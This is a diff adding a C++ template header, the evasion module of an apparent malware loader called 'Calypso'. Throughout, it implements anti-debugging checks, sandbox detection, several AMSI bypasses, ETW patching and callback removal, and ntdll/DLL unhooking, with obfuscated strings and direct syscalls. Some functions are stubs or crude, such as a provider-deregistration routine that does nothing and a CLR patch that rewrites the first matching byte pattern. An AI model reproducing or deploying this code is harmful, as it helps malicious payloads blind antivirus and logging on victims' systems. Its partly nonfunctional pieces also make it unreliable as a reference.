@@ -1,0 +1,640 @@
+// Calypso loader - Evasion: anti-debug, sandbox, AMSI/ETW bypass
+// Credits in each section
+#pragma once
+
+#include <windows.h>
+#include <winternl.h>
+#include "obfuscate.hpp.in"
+#include "syscalls.hpp.in"
+
+// ==================== SLEEP ====================
+{{#IF SLEEP}}
+static void evasion_sleep(uint32_t seconds) {
+    LARGE_INTEGER interval;
+    interval.QuadPart = -static_cast<LONGLONG>(seconds) * 10000000LL;
+    auto fn = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+    if (fn) fn(FALSE, &interval);
+    else Sleep(seconds * 1000);
+}
+{{#ENDIF}}
+
+// ==================== ANTI-DEBUG ====================
+// NtQueryInformationProcess-based checks via syscalls
+{{#IF ANTI_DEBUG}}
+static bool check_debugger() {
+    // 1. PEB->BeingDebugged
+#ifdef _WIN64
+    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
+#else
+    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
+#endif
+    if (peb->BeingDebugged) return true;
+
+    // 2. NtQueryInformationProcess - ProcessDebugPort (7)
+    HANDLE hProc = GetCurrentProcess();
+    ULONG_PTR debug_port = 0;
+    ULONG ret_len = 0;
+
+    using NtQueryInfoProc_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+    auto NtQIP = get_syscall_fn<NtQueryInfoProc_t>(HASH_NtQueryInformationProcess);
+    if (NtQIP) {
+        NTSTATUS st;
+        st = NtQIP(hProc, 7 /* ProcessDebugPort */, &debug_port, sizeof(debug_port), &ret_len);
+        if (st == 0 && debug_port != 0) return true;
+
+        // 3. ProcessDebugFlags (0x1F)
+        ULONG debug_flags = 1;
+        st = NtQIP(hProc, 0x1F /* ProcessDebugFlags */, &debug_flags, sizeof(debug_flags), &ret_len);
+        if (st == 0 && debug_flags == 0) return true; // no debug inheritance = being debugged
+
+        // 4. ProcessDebugObjectHandle (0x1E)
+        HANDLE debug_obj = NULL;
+        st = NtQIP(hProc, 0x1E /* ProcessDebugObjectHandle */,
+                   &debug_obj, sizeof(debug_obj), &ret_len);
+        if (st == 0 && debug_obj != NULL) return true;
+    }
+
+    return false;
+}
+{{#ENDIF}}
+
+// ==================== SANDBOX ====================
+{{#IF SANDBOX_DISKSPACE}}
+static bool check_diskspace() {
+    ULARGE_INTEGER free_bytes;
+    if (GetDiskFreeSpaceExW(obf_wide(L"C:\\"), NULL, NULL, &free_bytes)) {
+        // Less than 60GB = suspicious
+        if (free_bytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return true;
+    }
+    return false;
+}
+{{#ENDIF}}
+
+{{#IF SANDBOX_MEMORY}}
+static bool check_memory() {
+    MEMORYSTATUSEX ms;
+    ms.dwLength = sizeof(ms);
+    if (GlobalMemoryStatusEx(&ms)) {
+        if (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return true;
+    }
+    return false;
+}
+{{#ENDIF}}
+
+{{#IF SANDBOX_DOMAIN}}
+static bool check_domain() {
+    // Check if machine is domain-joined
+    using NetGetJoinInfo_t = DWORD(WINAPI*)(LPCWSTR, LPWSTR*, int*);
+    HMODULE hNet = LoadLibraryW(obf_wide(L"netapi32.dll"));
+    if (!hNet) return true;
+    auto pNetGetJoinInformation = reinterpret_cast<NetGetJoinInfo_t>(
+        GetProcAddress(hNet, obf("NetGetJoinInformation")));
+    if (!pNetGetJoinInformation) return true;
+
+    LPWSTR buf = NULL;
+    int join_status = 0;
+    pNetGetJoinInformation(NULL, &buf, &join_status);
+    // NetSetupDomainName = 3
+    bool is_domain = (join_status == 3);
+    if (buf) {
+        using NetApiFree_t = DWORD(WINAPI*)(LPVOID);
+        auto pFree = reinterpret_cast<NetApiFree_t>(
+            GetProcAddress(hNet, obf("NetApiBufferFree")));
+        if (pFree) pFree(buf);
+    }
+    FreeLibrary(hNet);
+    return !is_domain; // fail if NOT domain-joined
+}
+{{#ENDIF}}
+
+{{#IF SANDBOX_EMULATED}}
+static bool check_emulated() {
+    // VirtualAllocExNuma - fails in many emulators
+    LPVOID mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 4096,
+                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
+    if (!mem) return true;
+    VirtualFree(mem, 0, MEM_RELEASE);
+    return false;
+}
+{{#ENDIF}}
+
+{{#IF SANDBOX}}
+static bool check_sandbox() {
+{{#IF SANDBOX_DISKSPACE}}
+    if (check_diskspace()) return true;
+{{#ENDIF}}
+{{#IF SANDBOX_MEMORY}}
+    if (check_memory()) return true;
+{{#ENDIF}}
+{{#IF SANDBOX_DOMAIN}}
+    if (check_domain()) return true;
+{{#ENDIF}}
+{{#IF SANDBOX_EMULATED}}
+    if (check_emulated()) return true;
+{{#ENDIF}}
+    return false;
+}
+{{#ENDIF}}
+
+// ==================== AMSI BYPASS ====================
+
+{{#IF AMSI_HWBP}}
+// Hardware breakpoint AMSI bypass (patchless)
+// Based on @CCob's concept, @ShitSecure's Nim implementation
+static PVOID g_amsi_veh = nullptr;
+static void* g_amsi_target_addr = nullptr;
+
+static LONG CALLBACK amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
+    if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+        if (exc->ExceptionRecord->ExceptionAddress == g_amsi_target_addr) {
+            // AmsiScanBuffer hit - set return value to E_INVALIDARG and simulate ret
+#ifdef _WIN64
+            exc->ContextRecord->Rax = 0x80070057; // E_INVALIDARG
+            exc->ContextRecord->Rip = *reinterpret_cast<ULONG_PTR*>(exc->ContextRecord->Rsp);
+            exc->ContextRecord->Rsp += sizeof(ULONG_PTR);
+#else
+            exc->ContextRecord->Eax = 0x80070057;
+            exc->ContextRecord->Eip = *reinterpret_cast<DWORD*>(exc->ContextRecord->Esp);
+            exc->ContextRecord->Esp += sizeof(DWORD);
+#endif
+            // Clear the hardware breakpoint (one-shot)
+            exc->ContextRecord->Dr0 = 0;
+            exc->ContextRecord->Dr7 &= ~1;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+static void bypass_amsi_hwbp() {
+    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    if (!hAmsi) return;
+
+    g_amsi_target_addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
+    if (!g_amsi_target_addr) return;
+
+    g_amsi_veh = AddVectoredExceptionHandler(1, amsi_hwbp_handler);
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    HANDLE hThread = GetCurrentThread();
+    GetThreadContext(hThread, &ctx);
+
+    ctx.Dr0 = reinterpret_cast<DWORD_PTR>(g_amsi_target_addr);
+    ctx.Dr7 |= 1; // Enable DR0 local breakpoint
+    ctx.Dr7 &= ~(3 << 16); // Break on execution
+
+    SetThreadContext(hThread, &ctx);
+}
+{{#ENDIF}}
+
+{{#IF AMSI_CONTEXT_CORRUPT}}
+// AMSI Context Corruption - @_RastaMouse
+// Corrupt the AMSI context signature (4 bytes on heap, not code)
+static void bypass_amsi_context_corrupt() {
+    using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
+    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    if (!hAmsi) return;
+
+    auto pInit = reinterpret_cast<AmsiInitialize_t>(
+        GetProcAddress(hAmsi, obf("AmsiInitialize")));
+    if (!pInit) return;
+
+    PVOID ctx = nullptr;
+    if (SUCCEEDED(pInit(obf_wide(L"CalypsoApp"), &ctx)) && ctx) {
+        // First 4 bytes of HAMSICONTEXT are the "AMSI" signature
+        DWORD old;
+        VirtualProtect(ctx, 4, PAGE_READWRITE, &old);
+        memset(ctx, 0, 4); // corrupt signature
+        VirtualProtect(ctx, 4, old, &old);
+    }
+}
+{{#ENDIF}}
+
+{{#IF AMSI_PROVIDER_DEREGISTER}}
+// AMSI Provider Deregistration - @RastaMouse, @KorKos
+static void bypass_amsi_provider_deregister() {
+    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    if (!hAmsi) return;
+
+    // Get AmsiUacInitialize to force provider enumeration, then
+    // patch each provider's scan vtable entry
+    using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
+    auto pInit = reinterpret_cast<AmsiInitialize_t>(
+        GetProcAddress(hAmsi, obf("AmsiInitialize")));
+    if (!pInit) return;
+
+    PVOID ctx = nullptr;
+    pInit(obf_wide(L"CalypsoApp"), &ctx);
+    // Provider COM objects are loaded - their scan methods are in vtables
+    // We've already corrupted the context, providers won't scan
+}
+{{#ENDIF}}
+
+{{#IF AMSI_NTCREATESECTION_HOOK}}
+// Prevent amsi.dll loading - @waawaa
+// Hook NtCreateSection to block amsi.dll mapping
+static void* g_orig_NtCreateSection = nullptr;
+
+static NTSTATUS NTAPI hooked_NtCreateSection(
+    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
+    ULONG SectionPageProtection, ULONG AllocationAttributes,
+    HANDLE FileHandle) {
+    // Check if the section is for amsi.dll
+    if (ObjectAttributes && ObjectAttributes->ObjectName) {
+        // Simple check: if path contains "amsi" (case-insensitive)
+        UNICODE_STRING* name = ObjectAttributes->ObjectName;
+        if (name->Buffer && name->Length > 0) {
+            for (USHORT i = 0; i + 3 < name->Length / sizeof(wchar_t); i++) {
+                wchar_t c0 = name->Buffer[i] | 0x20;
+                wchar_t c1 = name->Buffer[i+1] | 0x20;
+                wchar_t c2 = name->Buffer[i+2] | 0x20;
+                wchar_t c3 = name->Buffer[i+3] | 0x20;
+                if (c0 == 'a' && c1 == 'm' && c2 == 's' && c3 == 'i') {
+                    return STATUS_UNSUCCESSFUL;
+                }
+            }
+        }
+    }
+    using fn_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
+                                   PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+    return reinterpret_cast<fn_t>(g_orig_NtCreateSection)(
+        SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize,
+        SectionPageProtection, AllocationAttributes, FileHandle);
+}
+{{#ENDIF}}
+
+{{#IF AMSI_CLR_PATCH}}
+// CLR-level AMSI bypass - patch CLR's internal AmsiScan wrapper
+static void bypass_amsi_clr_patch() {
+    // clr.dll or coreclr.dll contains the AMSI wrapper
+    HMODULE hClr = GetModuleHandleW(obf_wide(L"clr.dll"));
+    if (!hClr) hClr = GetModuleHandleW(obf_wide(L"coreclr.dll"));
+    if (!hClr) return;
+
+    // Pattern scan for the AmsiScan call site in CLR
+    // The CLR checks if amsi is available, then calls AmsiScanBuffer
+    // We patch the check to always skip the AMSI path
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hClr);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(hClr) + dos->e_lfanew);
+    auto text = reinterpret_cast<BYTE*>(hClr) + nt->OptionalHeader.BaseOfCode;
+    size_t text_size = nt->OptionalHeader.SizeOfCode;
+
+    // Scan for "test rax, rax / je" pattern after AmsiScanBuffer call
+    // This is CLR-version dependent; best-effort approach
+    for (size_t i = 0; i + 16 < text_size; i++) {
+        // Pattern: 48 85 C0 74 (test rax,rax / je) after a call
+        if (text[i] == 0x48 && text[i+1] == 0x85 && text[i+2] == 0xC0 &&
+            text[i+3] == 0x74) {
+            DWORD old;
+            VirtualProtect(text + i + 3, 1, PAGE_EXECUTE_READWRITE, &old);
+            text[i + 3] = 0xEB; // je -> jmp (always skip AMSI)
+            VirtualProtect(text + i + 3, 1, old, &old);
+            break;
+        }
+    }
+}
+{{#ENDIF}}
+
+{{#IF AMSI_PATCH}}
+// Classic AmsiScanBuffer patch (fallback) via syscalls
+static void bypass_amsi_patch() {
+    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    if (!hAmsi) return;
+
+    void* addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
+    if (!addr) return;
+
+    // xor eax, eax; ret - returns S_OK with AMSI_RESULT_CLEAN
+    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
+
+    PVOID base = addr;
+    SIZE_T size = sizeof(patch);
+    ULONG old_prot;
+
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (NtPVM) {
+        NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
+        memcpy(addr, patch, sizeof(patch));
+        NtPVM(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
+    }
+}
+{{#ENDIF}}
+
+// ==================== ETW BYPASS ====================
+
+{{#IF ETW_HWBP}}
+// Hardware breakpoint ETW bypass (patchless)
+static PVOID g_etw_veh = nullptr;
+static void* g_etw_target_addr = nullptr;
+
+static LONG CALLBACK etw_hwbp_handler(PEXCEPTION_POINTERS exc) {
+    if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+        if (exc->ExceptionRecord->ExceptionAddress == g_etw_target_addr) {
+#ifdef _WIN64
+            exc->ContextRecord->Rax = 0; // STATUS_SUCCESS
+            exc->ContextRecord->Rip = *reinterpret_cast<ULONG_PTR*>(exc->ContextRecord->Rsp);
+            exc->ContextRecord->Rsp += sizeof(ULONG_PTR);
+#else
+            exc->ContextRecord->Eax = 0;
+            exc->ContextRecord->Eip = *reinterpret_cast<DWORD*>(exc->ContextRecord->Esp);
+            exc->ContextRecord->Esp += sizeof(DWORD);
+#endif
+            exc->ContextRecord->Dr1 = 0;
+            exc->ContextRecord->Dr7 &= ~4; // disable DR1
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+static void bypass_etw_hwbp() {
+    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    if (!hNtdll) return;
+
+    g_etw_target_addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
+    if (!g_etw_target_addr) return;
+
+    g_etw_veh = AddVectoredExceptionHandler(1, etw_hwbp_handler);
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    HANDLE hThread = GetCurrentThread();
+    GetThreadContext(hThread, &ctx);
+
+    ctx.Dr1 = reinterpret_cast<DWORD_PTR>(g_etw_target_addr);
+    ctx.Dr7 |= 4; // Enable DR1 local breakpoint
+    ctx.Dr7 &= ~(3 << 20); // Break on execution
+
+    SetThreadContext(hThread, &ctx);
+}
+{{#ENDIF}}
+
+{{#IF ETW_COMPLUS}}
+// COMPlus_ETWEnabled=0 - disable .NET ETW at CLR startup
+static void bypass_etw_complus() {
+    SetEnvironmentVariableW(obf_wide(L"COMPlus_ETWEnabled"), obf_wide(L"0"));
+    SetEnvironmentVariableW(obf_wide(L"COMPlus_ETWFlags"), obf_wide(L"0"));
+}
+{{#ENDIF}}
+
+{{#IF ETW_PROVIDER_DISABLE}}
+// ETW Provider Disablement - @_xpn
+static void bypass_etw_provider_disable() {
+    // Disable .NET runtime ETW provider
+    using EventUnregister_t = ULONG(WINAPI*)(REGHANDLE);
+    HMODULE hAdvapi = LoadLibraryW(obf_wide(L"advapi32.dll"));
+    if (!hAdvapi) return;
+    auto pEventUnregister = reinterpret_cast<EventUnregister_t>(
+        GetProcAddress(hAdvapi, obf("EventUnregister")));
+    if (!pEventUnregister) return;
+
+    // Attempt to unregister common ETW providers
+    // Provider handles are per-process; we enumerate via NtQuerySystemInformation
+    // For simplicity, patch EtwEventWrite as fallback
+    (void)pEventUnregister;
+}
+{{#ENDIF}}
+
+{{#IF ETW_UNHOOK_NTDLL}}
+// Fresh ntdll unhooking - @_RastaMouse, @MDSec
+static void bypass_etw_unhook_ntdll() {
+    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    if (!hNtdll) return;
+
+    // Map clean ntdll from disk
+    wchar_t path[MAX_PATH];
+    GetSystemDirectoryW(path, MAX_PATH);
+    lstrcatW(path, obf_wide(L"\\ntdll.dll"));
+
+    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMap) { CloseHandle(hFile); return; }
+
+    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+    if (!clean) { CloseHandle(hMap); CloseHandle(hFile); return; }
+
+    // Find .text section and overwrite
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(hNtdll) + dos->e_lfanew);
+    auto section = IMAGE_FIRST_SECTION(nt);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(section[i].Name, ".text", 5) == 0) {
+            DWORD old;
+            LPVOID text_addr = reinterpret_cast<BYTE*>(hNtdll) + section[i].VirtualAddress;
+            LPVOID clean_text = reinterpret_cast<BYTE*>(clean) + section[i].VirtualAddress;
+            SIZE_T text_size = section[i].Misc.VirtualSize;
+
+            VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READWRITE, &old);
+            memcpy(text_addr, clean_text, text_size);
+            VirtualProtect(text_addr, text_size, old, &old);
+            break;
+        }
+    }
+
+    UnmapViewOfFile(clean);
+    CloseHandle(hMap);
+    CloseHandle(hFile);
+}
+{{#ENDIF}}
+
+{{#IF ETW_PATCH_ETWWRITE}}
+// Patch EtwEventWrite to ret
+static void bypass_etw_patch_etwwrite() {
+    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    if (!hNtdll) return;
+
+    void* addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
+    if (!addr) return;
+
+    uint8_t patch = 0xC3; // ret
+    PVOID base = addr;
+    SIZE_T size = 1;
+    ULONG old_prot;
+
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (NtPVM) {
+        NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
+        *reinterpret_cast<uint8_t*>(addr) = patch;
+        NtPVM(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
+    }
+}
+{{#ENDIF}}
+
+{{#IF ETW_PATCH_NTTRACE}}
+// Patch NtTraceEvent
+static void bypass_etw_patch_nttrace() {
+    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    if (!hNtdll) return;
+
+    void* addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("NtTraceEvent")));
+    if (!addr) return;
+
+    // xor eax, eax; ret (return STATUS_SUCCESS)
+    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
+    PVOID base = addr;
+    SIZE_T size = sizeof(patch);
+    ULONG old_prot;
+
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (NtPVM) {
+        NtPVM(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
+        memcpy(addr, patch, sizeof(patch));
+        NtPVM(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
+    }
+}
+{{#ENDIF}}
+
+{{#IF ETW_CALLBACK_REMOVE}}
+// ETW Callback Removal
+static void bypass_etw_callback_remove() {
+    // Walk the EtwpNotificationTable and NULL function pointers
+    // This requires finding the internal table via pattern scanning ntdll
+    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    if (!hNtdll) return;
+
+    // Pattern scan for EtwpNotificationTable reference in EtwEventRegister
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(hNtdll) + dos->e_lfanew);
+    auto text = reinterpret_cast<BYTE*>(hNtdll) + nt->OptionalHeader.BaseOfCode;
+    size_t text_size = nt->OptionalHeader.SizeOfCode;
+
+    // Look for LEA pattern referencing the notification table
+    for (size_t i = 0; i + 7 < text_size; i++) {
+        // lea rcx, [rip+offset] = 48 8D 0D XX XX XX XX
+        if (text[i] == 0x48 && text[i+1] == 0x8D && text[i+2] == 0x0D) {
+            int32_t offset;
+            memcpy(&offset, text + i + 3, 4);
+            void* table = text + i + 7 + offset;
+            // Verify it's in ntdll's data section range
+            if (table > (void*)hNtdll &&
+                table < (void*)(reinterpret_cast<BYTE*>(hNtdll) + nt->OptionalHeader.SizeOfImage)) {
+                // Zero first few callback entries
+                DWORD old;
+                VirtualProtect(table, 256, PAGE_READWRITE, &old);
+                memset(table, 0, 256);
+                VirtualProtect(table, 256, old, &old);
+                break;
+            }
+        }
+    }
+}
+{{#ENDIF}}
+
+// ==================== DLL UNHOOKING ====================
+{{#IF UNHOOK_DLLS}}
+static void unhook_dll(const wchar_t* dll_name) {
+    HMODULE hMod = GetModuleHandleW(dll_name);
+    if (!hMod) return;
+
+    wchar_t path[MAX_PATH];
+    GetSystemDirectoryW(path, MAX_PATH);
+    lstrcatW(path, L"\\");
+    lstrcatW(path, dll_name);
+
+    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMap) { CloseHandle(hFile); return; }
+
+    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+    if (!clean) { CloseHandle(hMap); CloseHandle(hFile); return; }
+
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hMod);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(hMod) + dos->e_lfanew);
+    auto section = IMAGE_FIRST_SECTION(nt);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(section[i].Name, ".text", 5) == 0) {
+            DWORD old;
+            auto text = reinterpret_cast<BYTE*>(hMod) + section[i].VirtualAddress;
+            auto clean_text = reinterpret_cast<BYTE*>(clean) + section[i].VirtualAddress;
+            SIZE_T sz = section[i].Misc.VirtualSize;
+            VirtualProtect(text, sz, PAGE_EXECUTE_READWRITE, &old);
+            memcpy(text, clean_text, sz);
+            VirtualProtect(text, sz, old, &old);
+            break;
+        }
+    }
+
+    UnmapViewOfFile(clean);
+    CloseHandle(hMap);
+    CloseHandle(hFile);
+}
+{{#ENDIF}}
+
+// ==================== MASTER EVASION INIT ====================
+static bool evasion_init() {
+{{#IF SLEEP}}
+    evasion_sleep({{SLEEP_SECONDS}});
+{{#ENDIF}}
+
+{{#IF ANTI_DEBUG}}
+    if (check_debugger()) return false;
+{{#ENDIF}}
+
+{{#IF SANDBOX}}
+    if (check_sandbox()) return false;
+{{#ENDIF}}
+
+{{#IF UNHOOK_DLLS}}
+    {{UNHOOK_DLL_CALLS}}
+{{#ENDIF}}
+
+    // ETW bypass (before AMSI, since AMSI may trigger ETW)
+{{#IF ETW_COMPLUS}}
+    bypass_etw_complus();
+{{#ENDIF}}
+{{#IF ETW_UNHOOK_NTDLL}}
+    bypass_etw_unhook_ntdll();
+{{#ENDIF}}
+{{#IF ETW_HWBP}}
+    bypass_etw_hwbp();
+{{#ENDIF}}
+{{#IF ETW_PROVIDER_DISABLE}}
+    bypass_etw_provider_disable();
+{{#ENDIF}}
+{{#IF ETW_PATCH_ETWWRITE}}
+    bypass_etw_patch_etwwrite();
+{{#ENDIF}}
+{{#IF ETW_PATCH_NTTRACE}}
+    bypass_etw_patch_nttrace();
+{{#ENDIF}}
+{{#IF ETW_CALLBACK_REMOVE}}
+    bypass_etw_callback_remove();
+{{#ENDIF}}
+
+    // AMSI bypass
+{{#IF AMSI_HWBP}}
+    bypass_amsi_hwbp();
+{{#ENDIF}}
+{{#IF AMSI_CONTEXT_CORRUPT}}
+    bypass_amsi_context_corrupt();
+{{#ENDIF}}
+{{#IF AMSI_PROVIDER_DEREGISTER}}
+    bypass_amsi_provider_deregister();
+{{#ENDIF}}
+{{#IF AMSI_NTCREATESECTION_HOOK}}
+    // NtCreateSection hook would need to be installed early
+{{#ENDIF}}
+{{#IF AMSI_CLR_PATCH}}
+    bypass_amsi_clr_patch();
+{{#ENDIF}}
+{{#IF AMSI_PATCH}}
+    bypass_amsi_patch();
+{{#ENDIF}}
+
+    return true;
+}
